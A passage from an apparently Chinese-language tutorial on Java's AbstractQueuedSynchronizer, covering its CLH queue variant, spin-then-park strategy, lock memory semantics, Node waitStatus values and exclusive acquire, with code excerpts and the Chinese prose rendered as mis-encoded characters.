<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">ç»å…¸CLH</th><th align="left">AQS CLHå˜ä½“</th></tr></thead><tbody><tr><td align="left">é“¾è¡¨æ–¹å‘</td><td align="left">å•å‘ï¼ˆéšå¼ï¼‰</td><td align="left">åŒå‘ï¼ˆæ˜¾å¼prev/nextï¼‰</td></tr><tr><td align="left">ç­‰å¾…æ–¹å¼</td><td align="left">è‡ªæ—‹</td><td align="left">park/unparké˜»å¡</td></tr><tr><td align="left">èŠ‚ç‚¹çŠ¶æ€</td><td align="left">ç®€å•locked</td><td align="left">å¤šç§waitStatus</td></tr><tr><td align="left">å–æ¶ˆæ”¯æŒ</td><td align="left">ä¸æ”¯æŒ</td><td align="left">æ”¯æŒï¼ˆCANCELLEDçŠ¶æ€ï¼‰</td></tr><tr><td align="left">è¶…æ—¶æ”¯æŒ</td><td align="left">ä¸æ”¯æŒ</td><td align="left">æ”¯æŒ</td></tr></tbody></table>
<h4 data-id="heading-43">3.3 ä¸ºä»€ä¹ˆä½¿ç”¨åŒå‘é“¾è¡¨</h4>
<p><strong>å•å‘é“¾è¡¨çš„é—®é¢˜</strong>ï¼š</p>
<ol>
<li>å–æ¶ˆèŠ‚ç‚¹æ—¶ï¼Œæ— æ³•å¿«é€Ÿæ‰¾åˆ°å‰é©±æ¥ä¿®æ”¹nextæŒ‡é’ˆ</li>
<li>è¶…æ—¶/ä¸­æ–­æ—¶éœ€è¦ä»å¤´éå†</li>
</ol>
<p><strong>åŒå‘é“¾è¡¨çš„ä¼˜åŠ¿</strong>ï¼š</p>
<ol>
<li>O(1)æ—¶é—´æ‰¾åˆ°å‰é©±èŠ‚ç‚¹</li>
<li>ä¾¿äºå®ç°å–æ¶ˆå’Œè¶…æ—¶é€»è¾‘</li>
<li>å”¤é†’åç»§æ—¶æ›´é«˜æ•ˆ</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å–æ¶ˆèŠ‚ç‚¹æ—¶éœ€è¦æ‰¾åˆ°æœ‰æ•ˆå‰é©±</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelAcquire</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-comment">// ...</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">pred</span> <span class="hljs-operator">=</span> node.prev;
    <span class="hljs-keyword">while</span> (pred.waitStatus &gt; <span class="hljs-number">0</span>)  <span class="hljs-comment">// è·³è¿‡å·²å–æ¶ˆçš„å‰é©±</span>
        node.prev = pred = pred.prev;
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h4 data-id="heading-44">3.4 è‡ªæ—‹é”ä¸AQSçš„è‡ªæ—‹æœºåˆ¶</h4>
<p><strong>ä»€ä¹ˆæ˜¯è‡ªæ—‹é”ï¼Ÿ</strong></p>
<p>è‡ªæ—‹é”æ˜¯ä¸€ç§å¿™ç­‰å¾…é”ï¼Œçº¿ç¨‹åœ¨è·å–é”å¤±è´¥æ—¶ä¸ä¼šç«‹å³é˜»å¡ï¼Œè€Œæ˜¯åœ¨å¾ªç¯ä¸­ä¸æ–­å°è¯•è·å–é”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ç®€å•è‡ªæ—‹é”ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleSpinLock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">locked</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">false</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è‡ªæ—‹ï¼šä¸æ–­å°è¯•ï¼Œç›´åˆ°æˆåŠŸ</span>
        <span class="hljs-keyword">while</span> (!locked.compareAndSet(<span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>)) {
            <span class="hljs-comment">// è‡ªæ—‹ç­‰å¾…ï¼Œæ¶ˆè€—CPU</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> {
        locked.set(<span class="hljs-literal">false</span>);
    }
}
</code></pre>
<p><strong>è‡ªæ—‹çš„ä¼˜ç¼ºç‚¹</strong>ï¼š</p>

























<table><thead><tr><th align="left">æ–¹é¢</th><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th></tr></thead><tbody><tr><td align="left">CPUä½¿ç”¨</td><td align="left">æ— ä¸Šä¸‹æ–‡åˆ‡æ¢</td><td align="left">æŒç»­æ¶ˆè€—CPU</td></tr><tr><td align="left">å»¶è¿Ÿ</td><td align="left">é”é‡Šæ”¾åç«‹å³è·å–</td><td align="left">é•¿æ—¶é—´ç­‰å¾…æµªè´¹CPU</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">é”æŒæœ‰æ—¶é—´çŸ­</td><td align="left">é”æŒæœ‰æ—¶é—´é•¿æ—¶æ•ˆç‡ä½</td></tr></tbody></table>
<p><strong>AQSä¸­çš„è‡ªæ—‹æœºåˆ¶</strong>ï¼š</p>
<p>AQS<strong>å¹¶éçº¯è‡ªæ—‹é”</strong>ï¼Œè€Œæ˜¯é‡‡ç”¨<strong>è‡ªæ—‹+é˜»å¡</strong>çš„æ··åˆç­–ç•¥ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * acquireQueuedä¸­çš„è‡ªæ—‹é€»è¾‘
 * å…³é”®ï¼šä¸æ˜¯ä¸€ç›´è‡ªæ—‹ï¼Œè€Œæ˜¯æœ‰æ¡ä»¶åœ°è‡ªæ—‹
 */</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">acquireQueued</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node, <span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">boolean</span> <span class="hljs-variable">interrupted</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (;;) {  <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ª"è‡ªæ—‹"å¾ªç¯</span>
            <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> node.predecessor();
            
            <span class="hljs-comment">// ã€è‡ªæ—‹å°è¯•1ã€‘åªæœ‰å‰é©±æ˜¯headæ—¶æ‰å°è¯•è·å–é”</span>
            <span class="hljs-keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) {
                setHead(node);
                p.next = <span class="hljs-literal">null</span>;
                failed = <span class="hljs-literal">false</span>;
                <span class="hljs-keyword">return</span> interrupted;
            }
            
            <span class="hljs-comment">// ã€å…³é”®ã€‘ä¸æ»¡è¶³æ¡ä»¶æ—¶ï¼Œä¸æ˜¯ç»§ç»­è‡ªæ—‹ï¼Œè€Œæ˜¯parké˜»å¡ï¼</span>
            <span class="hljs-keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;
                parkAndCheckInterrupt())
                interrupted = <span class="hljs-literal">true</span>;
        }
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">if</span> (failed)
            cancelAcquire(node);
    }
}
</code></pre>
<p><strong>AQSè‡ªæ—‹ç­–ç•¥çš„ç²¾å¦™ä¹‹å¤„</strong>ï¼š</p>
<ol>
<li><strong>æœ‰é™è‡ªæ—‹</strong>ï¼šåªæœ‰å‰é©±æ˜¯headï¼ˆå³é©¬ä¸Šè½®åˆ°è‡ªå·±ï¼‰æ—¶æ‰è‡ªæ—‹å°è¯•</li>
<li><strong>å¿«é€Ÿé˜»å¡</strong>ï¼šå…¶ä»–æƒ…å†µç›´æ¥parké˜»å¡ï¼Œé¿å…CPUç©ºè½¬</li>
<li><strong>å”¤é†’åè‡ªæ—‹</strong>ï¼šè¢«unparkå”¤é†’åï¼Œå†æ¬¡è¿›å…¥å¾ªç¯å°è¯•</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸ºä»€ä¹ˆè¦åœ¨parkå‰å†è‡ªæ—‹ä¸€æ¬¡ï¼Ÿ</span>
<span class="hljs-comment">// å› ä¸ºåœ¨è®¾ç½®SIGNALå’Œparkä¹‹é—´ï¼Œé”å¯èƒ½å·²ç»é‡Šæ”¾äº†</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldParkAfterFailedAcquire</span><span class="hljs-params">(Node pred, Node node)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> pred.waitStatus;
    <span class="hljs-keyword">if</span> (ws == Node.SIGNAL)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å¯ä»¥å®‰å…¨é˜»å¡</span>
    <span class="hljs-comment">// ... è®¾ç½®SIGNAL</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¿”å›falseï¼Œå¤–å±‚å¾ªç¯ä¼šå†å°è¯•ä¸€æ¬¡acquireï¼</span>
}
</code></pre>
<h4 data-id="heading-45">3.5 é”çš„å†…å­˜è¯­ä¹‰</h4>
<p>ä» JMM çš„è§’åº¦çœ‹ï¼Œé”æ—¢æä¾›äº’æ–¥ï¼Œä¹Ÿæä¾›å†…å­˜å¯è§æ€§ä¿éšœã€‚å…·ä½“æ¥è¯´ï¼š<strong>å¯¹åŒä¸€æŠŠé”çš„é‡Šæ”¾ä¸è·å–ä¹‹é—´å­˜åœ¨â€œhappens-beforeâ€ å…³ç³»</strong>ã€‚ä¸€ä¸ªçº¿ç¨‹åœ¨é‡Šæ”¾é”æ—¶ï¼Œä¼šæŠŠä¸´ç•ŒåŒºä¸­çš„æ‰€æœ‰å†™æ“ä½œåˆ·å›ä¸»å†…å­˜ï¼ˆç±»ä¼¼äºå¯¹ volatile å˜é‡çš„å†™ï¼‰ï¼›å¦ä¸€ä¸ªçº¿ç¨‹ä¹‹åè·å–åŒä¸€æŠŠé”æ—¶ï¼Œå¿…é¡»ä»ä¸»å†…å­˜ä¸­é‡æ–°è¯»å–è¿™äº›å˜é‡ï¼Œä»è€Œçœ‹åˆ°ä¹‹å‰çº¿ç¨‹çš„ä¿®æ”¹ï¼Œè¿™ç±»ä¼¼äºå¯¹ volatile å˜é‡çš„è¯»ã€‚</p>
<p>åœ¨ ReentrantLock å†…éƒ¨ï¼Œè¿™ç§è¯­ä¹‰æ˜¯é€šè¿‡ AQS çš„ <code>state</code> å­—æ®µï¼ˆvolatileï¼‰å’Œ CAS æ“ä½œå®ç°çš„ï¼šè·å–é”ä½¿ç”¨ CAS ä¿®æ”¹ stateï¼Œç›¸å½“äºä¸€æ¬¡â€œvolatile è¯» + volatile å†™â€ï¼›é‡Šæ”¾é”ä½¿ç”¨å¯¹ state çš„æ™®é€šå†™ï¼Œä½† state æœ¬èº«æ˜¯ volatile å˜é‡ï¼Œè¿™ä¼šæŠŠä¹‹å‰çš„ä¿®æ”¹åˆ·æ–°åˆ°ä¸»å†…å­˜ã€‚è¿™æ ·ï¼Œä¸´ç•ŒåŒºå†…çš„æ‰€æœ‰æ™®é€šå†™åœ¨é‡Šæ”¾é”åï¼Œå¯¹åç»­è·å–åŒä¸€æŠŠé”çš„çº¿ç¨‹éƒ½æ˜¯å¯è§çš„ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆç†è§£å†…å­˜è¯­ä¹‰å¾ˆé‡è¦ï¼Ÿ</strong></p>
<p>é”ä¸ä»…æä¾›äº’æ–¥ï¼Œè¿˜æä¾›<strong>å†…å­˜å¯è§æ€§</strong>ä¿è¯ã€‚è¿™æ˜¯å¾ˆå¤šå¼€å‘è€…å¿½ç•¥çš„å…³é”®ç‚¹ã€‚</p>
<p><strong>é”çš„å†…å­˜è¯­ä¹‰</strong>ï¼š</p>
<ol>
<li><strong>è·å–é”</strong>ï¼šç›¸å½“äºè¯»å–volatileå˜é‡ï¼Œä¼šæ¸…ç©ºæœ¬åœ°ç¼“å­˜ï¼Œä»ä¸»å†…å­˜é‡æ–°è¯»å–</li>
<li><strong>é‡Šæ”¾é”</strong>ï¼šç›¸å½“äºå†™å…¥volatileå˜é‡ï¼Œä¼šå°†æœ¬åœ°ç¼“å­˜åˆ·æ–°åˆ°ä¸»å†…å­˜</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”çš„å†…å­˜è¯­ä¹‰ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockMemorySemantics</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// è·å–é”ï¼šåç»­è¯»æ“ä½œä¸ä¼šé‡æ’åºåˆ°è¿™ä¹‹å‰</span>
        <span class="hljs-keyword">try</span> {
            x = <span class="hljs-number">1</span>;  <span class="hljs-comment">// è¿™äº›å†™å…¥åœ¨é‡Šæ”¾é”æ—¶ä¼šåˆ·æ–°åˆ°ä¸»å†…å­˜</span>
            y = <span class="hljs-number">2</span>;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// é‡Šæ”¾é”ï¼šä¹‹å‰çš„å†™æ“ä½œå¯¹å…¶ä»–çº¿ç¨‹å¯è§</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// è·å–é”ï¼šä¼šçœ‹åˆ°é‡Šæ”¾é”ä¹‹å‰çš„æ‰€æœ‰å†™å…¥</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è¿™é‡Œä¸€å®šèƒ½çœ‹åˆ° x=1, y=2</span>
            System.out.println(x + <span class="hljs-string">", "</span> + y);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<p><strong>AQSå¦‚ä½•å®ç°å†…å­˜è¯­ä¹‰ï¼Ÿ</strong></p>
<p>é€šè¿‡volatileå˜é‡<code>state</code>å’ŒCASæ“ä½œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–é”æ—¶çš„å†…å­˜è¯­ä¹‰</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSetState</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
    <span class="hljs-comment">// CASæ“ä½œå…·æœ‰volatileè¯»+å†™çš„å†…å­˜è¯­ä¹‰</span>
    <span class="hljs-keyword">return</span> unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, stateOffset, expect, update);
}

<span class="hljs-comment">// é‡Šæ”¾é”æ—¶çš„å†…å­˜è¯­ä¹‰</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(<span class="hljs-type">int</span> newState)</span> {
    state = newState;  <span class="hljs-comment">// volatileå†™ï¼Œåˆ·æ–°ç¼“å­˜åˆ°ä¸»å†…å­˜</span>
}
</code></pre>
<p><strong>volatile vs é”</strong>ï¼š</p>



































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">volatile</th><th align="left">é”</th></tr></thead><tbody><tr><td align="left">å¯è§æ€§</td><td align="left">âœ… ä¿è¯</td><td align="left">âœ… ä¿è¯</td></tr><tr><td align="left">åŸå­æ€§</td><td align="left">âŒ åªä¿è¯å•ä¸ªè¯»/å†™</td><td align="left">âœ… ä¿è¯ä¸´ç•ŒåŒºåŸå­æ€§</td></tr><tr><td align="left">æœ‰åºæ€§</td><td align="left">âœ… ç¦æ­¢é‡æ’åº</td><td align="left">âœ… ç¦æ­¢é‡æ’åº</td></tr><tr><td align="left">å¤åˆæ“ä½œ</td><td align="left">âŒ ä¸æ”¯æŒ</td><td align="left">âœ… æ”¯æŒ</td></tr><tr><td align="left">æ€§èƒ½</td><td align="left">æ›´å¥½ï¼ˆæ— é˜»å¡ï¼‰</td><td align="left">æœ‰é˜»å¡å¼€é”€</td></tr></tbody></table>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// volatileé€‚åˆçš„åœºæ™¯ï¼šçŠ¶æ€æ ‡å¿—</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">shutdown</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">()</span> {
    shutdown = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å•ä¸ªå†™æ“ä½œï¼Œvolatileè¶³å¤Ÿ</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">while</span> (!shutdown) {  <span class="hljs-comment">// å•ä¸ªè¯»æ“ä½œ</span>
        <span class="hljs-comment">// ...</span>
    }
}

<span class="hljs-comment">// volatileä¸é€‚åˆçš„åœºæ™¯ï¼šå¤åˆæ“ä½œ</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// ã€é”™è¯¯ã€‘è¿™æ˜¯è¯»-æ”¹-å†™ï¼Œä¸æ˜¯åŸå­æ“ä½œï¼</span>
}

<span class="hljs-comment">// æ­£ç¡®åšæ³•ï¼šä½¿ç”¨é”æˆ–AtomicInteger</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">safeIncrement</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        count++;  <span class="hljs-comment">// ç°åœ¨æ˜¯çº¿ç¨‹å®‰å…¨çš„</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-46">4. NodeèŠ‚ç‚¹è¯¦è§£</h3>
<h4 data-id="heading-47">4.1 Nodeç»“æ„</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-comment">/** å…±äº«æ¨¡å¼æ ‡è®° */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">SHARED</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
    <span class="hljs-comment">/** ç‹¬å æ¨¡å¼æ ‡è®° */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">EXCLUSIVE</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    
    <span class="hljs-comment">/** waitStatuså€¼ï¼šè¡¨ç¤ºçº¿ç¨‹å·²å–æ¶ˆ */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CANCELLED</span> <span class="hljs-operator">=</span>  <span class="hljs-number">1</span>;
    <span class="hljs-comment">/** waitStatuså€¼ï¼šè¡¨ç¤ºåç»§çº¿ç¨‹éœ€è¦å”¤é†’ */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SIGNAL</span>    <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;
    <span class="hljs-comment">/** waitStatuså€¼ï¼šè¡¨ç¤ºçº¿ç¨‹åœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­ç­‰å¾… */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONDITION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">2</span>;
    <span class="hljs-comment">/** waitStatuså€¼ï¼šè¡¨ç¤ºå…±äº«æ¨¡å¼ä¸‹æ— æ¡ä»¶ä¼ æ’­ */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">PROPAGATE</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3</span>;
    
    <span class="hljs-comment">/** ç­‰å¾…çŠ¶æ€ */</span>
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> waitStatus;
    
    <span class="hljs-comment">/** å‰é©±èŠ‚ç‚¹ */</span>
    <span class="hljs-keyword">volatile</span> Node prev;
    
    <span class="hljs-comment">/** åç»§èŠ‚ç‚¹ */</span>
    <span class="hljs-keyword">volatile</span> Node next;
    
    <span class="hljs-comment">/** èŠ‚ç‚¹ä¸­çš„çº¿ç¨‹ */</span>
    <span class="hljs-keyword">volatile</span> Thread thread;
    
    <span class="hljs-comment">/** é“¾æ¥ä¸‹ä¸€ä¸ªç­‰å¾…æ¡ä»¶çš„èŠ‚ç‚¹ï¼Œæˆ–ç‰¹æ®Šå€¼SHARED */</span>
    Node nextWaiter;
}
</code></pre>
<h4 data-id="heading-48">4.2 waitStatusçŠ¶æ€è¯¦è§£</h4>
<p><code>waitStatus</code>æ˜¯Nodeä¸­æœ€å¤æ‚çš„å­—æ®µï¼Œç”¨äºè¡¨ç¤ºèŠ‚ç‚¹çš„ç­‰å¾…çŠ¶æ€ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89987cdb1531417ebc3c42507ea93508~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=wvszJVVzaN07BGprM7JFh3CVx%2FY%3D" alt="waitstatus-state-diagram.drawio.png" loading="lazy"/></p>



































<table><thead><tr><th align="left">çŠ¶æ€å€¼</th><th align="left">åç§°</th><th align="left">å«ä¹‰</th></tr></thead><tbody><tr><td align="left"><strong>0</strong></td><td align="left">åˆå§‹çŠ¶æ€</td><td align="left">æ–°å»ºèŠ‚ç‚¹çš„é»˜è®¤çŠ¶æ€</td></tr><tr><td align="left"><strong>-1</strong></td><td align="left">SIGNAL</td><td align="left">å½“å‰èŠ‚ç‚¹é‡Šæ”¾é”åéœ€è¦å”¤é†’åç»§èŠ‚ç‚¹</td></tr><tr><td align="left"><strong>1</strong></td><td align="left">CANCELLED</td><td align="left">çº¿ç¨‹å·²å–æ¶ˆï¼ˆè¶…æ—¶æˆ–ä¸­æ–­ï¼‰</td></tr><tr><td align="left"><strong>-2</strong></td><td align="left">CONDITION</td><td align="left">èŠ‚ç‚¹åœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­ç­‰å¾…</td></tr><tr><td align="left"><strong>-3</strong></td><td align="left">PROPAGATE</td><td align="left">å…±äº«æ¨¡å¼ä¸‹ï¼Œé‡Šæ”¾æ“ä½œéœ€è¦ä¼ æ’­</td></tr></tbody></table>
<p><strong>SIGNALçŠ¶æ€çš„é‡è¦æ€§</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// èŠ‚ç‚¹å…¥é˜Ÿåï¼Œéœ€è¦å°†å‰é©±çš„waitStatusè®¾ä¸ºSIGNAL</span>
<span class="hljs-comment">// è¿™æ ·å‰é©±é‡Šæ”¾é”æ—¶æ‰ä¼šå”¤é†’å½“å‰èŠ‚ç‚¹</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldParkAfterFailedAcquire</span><span class="hljs-params">(Node pred, Node node)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> pred.waitStatus;
    <span class="hljs-keyword">if</span> (ws == Node.SIGNAL)
        <span class="hljs-comment">// å‰é©±å·²ç»æ˜¯SIGNALï¼Œå¯ä»¥å®‰å…¨é˜»å¡</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">if</span> (ws &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// å‰é©±å·²å–æ¶ˆï¼Œè·³è¿‡</span>
        <span class="hljs-keyword">do</span> {
            node.prev = pred = pred.prev;
        } <span class="hljs-keyword">while</span> (pred.waitStatus &gt; <span class="hljs-number">0</span>);
        pred.next = node;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å°†å‰é©±çŠ¶æ€è®¾ä¸ºSIGNAL</span>
        compareAndSetWaitStatus(pred, ws, Node.SIGNAL);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<h4 data-id="heading-49">4.3 èŠ‚ç‚¹æ¨¡å¼</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦ä¸ºå…±äº«æ¨¡å¼</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isShared</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> nextWaiter == SHARED;
}

<span class="hljs-comment">// åˆ›å»ºèŠ‚ç‚¹</span>
Node(Thread thread, Node mode) {     <span class="hljs-comment">// Used by addWaiter</span>
    <span class="hljs-built_in">this</span>.nextWaiter = mode;
    <span class="hljs-built_in">this</span>.thread = thread;
}

Node(Thread thread, <span class="hljs-type">int</span> waitStatus) { <span class="hljs-comment">// Used by Condition</span>
    <span class="hljs-built_in">this</span>.waitStatus = waitStatus;
    <span class="hljs-built_in">this</span>.thread = thread;
}
</code></pre>
<hr/>
<h3 data-id="heading-50">5. ç‹¬å æ¨¡å¼è·å–é”</h3>
<h4 data-id="heading-51">5.1 acquireæµç¨‹æ¦‚è§ˆ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (!tryAcquire(arg) &amp;&amp;
        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))
        selfInterrupt();
}
</code></pre>
<p>æ•´ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2259ba92ca041aa9b5f7e238c508c0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=W0jFx%2FiXsl52TkgJCuXwZtlg83s%3D" alt="acquire-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-52">5.2 tryAcquire - å­ç±»å®ç°</h4>
<p>ä»¥ReentrantLockçš„éå…¬å¹³é”ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// NonfairSync.tryAcquire</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-keyword">return</span> nonfairTryAcquire(acquires);
}

<span class="hljs-comment">// Sync.nonfairTryAcquire</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">nonfairTryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// é”ç©ºé—²ï¼ŒCASå°è¯•è·å–</span>
